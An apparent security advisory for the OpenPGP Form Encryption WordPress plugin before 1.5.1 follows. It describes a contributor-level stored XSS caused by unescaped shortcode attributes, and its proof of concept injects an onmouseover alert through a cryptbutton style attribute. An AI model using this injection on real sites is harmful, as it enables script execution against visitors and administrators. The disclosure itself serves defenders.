## WordPress Plugin Vulnerabilities

# OpenPGP Form Encryption for WordPress < 1.5.1 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.

### Proof of Concept

Note: This plugin adds code to either a Jetpack or Contact Form 7 so one of them must be installed. This PoC uses Jetpack's Contact Form as an example.
As a contributor add the following:
```
[contact-form subject='CONTACT']
[contact-field label='Name' type='name' required='1'/]
[contact-field label='Email' type='email' required='1'/]
[contact-field label='Phone' type='text'/]
[contact-field label='Comment' type='textarea' required='1'/]
[cryptbutton keyid=42 style='red" onmouseover="alert(/XSSstyle/)"']Encrypt[/cryptbutton]
[/contact-form]
```
Move your mouse over the "Encrypt" button to see the XSS
